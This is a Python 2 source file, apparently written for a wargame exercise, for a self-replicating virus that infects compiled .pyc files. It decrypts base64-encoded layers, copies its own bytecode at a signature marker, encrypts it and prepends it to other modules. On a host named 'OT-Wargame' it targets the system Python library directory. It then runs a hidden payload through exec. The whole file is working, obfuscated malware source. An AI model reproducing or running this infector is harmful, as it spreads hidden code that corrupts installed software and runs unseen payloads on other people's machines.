signature = "PY_2.6"
# -*- coding: utf-8 -*-

import socket
import marshal
import zlib
import glob
from base64 import b64decode, b64encode
import random

DECRYPT=None
exec b64decode("__XOR_LAYER_PY__")


if __file__.endswith('.pyc'):
    template = b64decode("__TEMPLATE_PY__")
    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)

    # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
    LOAD_CONST = None
    RETURN_VALUE = None
    Code = None
    CodeList = None
    EXEC_STMT = None
    exec b64decode("__BYTEPLAY_PY__")

    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
        if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
            EXPLOIT_SIZE = i + 2
            break
    if not EXPLOIT_SIZE:
        print "EXPLOIT_SIZE not found"

    data.code = data.code[:EXPLOIT_SIZE]
    data.code.append((LOAD_CONST, None))
    data.code.append((RETURN_VALUE, None))
    # print "payload clair %s" % CodeList(data.code)
    payload = b64encode(crypt(zlib.compress(marshal.dumps(data.to_code()))))
    template = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
    payload = Code.from_code(compile(template, "z", "exec")).code
    payload = CodeList(payload[:-2])
    #print "payload chiffré %s" % payload

    # ------------- GENERATING PAYLOAD DATA ---------------
    def infect(f_to_infect):
        print "j'infecte %s" % f_to_infect
        if f_to_infect.endswith("socket.pyc"):
            return

        f = open(f_to_infect, 'r')

        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))
        if data.code[1][1] == signature:
            return

        f.close()

        data.code[:0] = payload

        newfile = open(f_to_infect, 'w')
        newfile.write(head)
        marshal.dump(data.to_code(), newfile)
        newfile.close()


    # print """
    #
    # LLLLLLLLLLL                              lllllll   iiii          tttt                                         66666666  999999999
    # L:::::::::L                              l:::::l  i::::i      ttt:::t                                        6::::::6 99:::::::::99
    # L:::::::::L                              l:::::l   iiii       t:::::t                                       6::::::699:::::::::::::99
    # LL:::::::LL                              l:::::l              t:::::t                                      6::::::69::::::99999::::::9
    #   L:::::L                  ooooooooooo    l::::l iiiiiiittttttt:::::ttttttt      aaaaaaaaaaaaa            6::::::6 9:::::9     9:::::9
    #   L:::::L                oo:::::::::::oo  l::::l i:::::it:::::::::::::::::t      a::::::::::::a          6::::::6  9:::::9     9:::::9
    #   L:::::L               o:::::::::::::::o l::::l  i::::it:::::::::::::::::t      aaaaaaaaa:::::a        6::::::6    9:::::99999::::::9
    #   L:::::L               o:::::ooooo:::::o l::::l  i::::itttttt:::::::tttttt               a::::a       6::::::::6666699::::::::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t              aaaaaaa:::::a      6::::::::::::::6699999::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t            aa::::::::::::a      6::::::66666:::::6    9::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t           a::::aaaa::::::a      6:::::6     6:::::6  9::::::9
    #   L:::::L         LLLLLLo::::o     o::::o l::::l  i::::i      t:::::t    tttttta::::a    a:::::a      6:::::6     6:::::6 9::::::9
    # LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::ol::::::li::::::i     t::::::tttt:::::ta::::a    a:::::a      6::::::66666::::::69::::::9
    # L::::::::::::::::::::::Lo:::::::::::::::ol::::::li::::::i     tt::::::::::::::ta:::::aaaa::::::a       66:::::::::::::669::::::9
    # L::::::::::::::::::::::L oo:::::::::::oo l::::::li::::::i       tt:::::::::::tt a::::::::::aa:::a        66:::::::::66 9::::::9
    # LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo   lllllllliiiiiiii         ttttttttttt    aaaaaaaaaa  aaaa          666666666  99999999
    # """
    #print "ici 3"
    if socket.gethostname() == "OT-Wargame":
        target_dir = "/usr/lib/python2.6/*.pyc"
    else:
        target_dir = "./targets/*.pyc"

    for i in glob.glob(target_dir):
        infect(i)

    # print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."

    exec b64decode("__PAYLOAD_PY__")

signature = "PY_2.6"
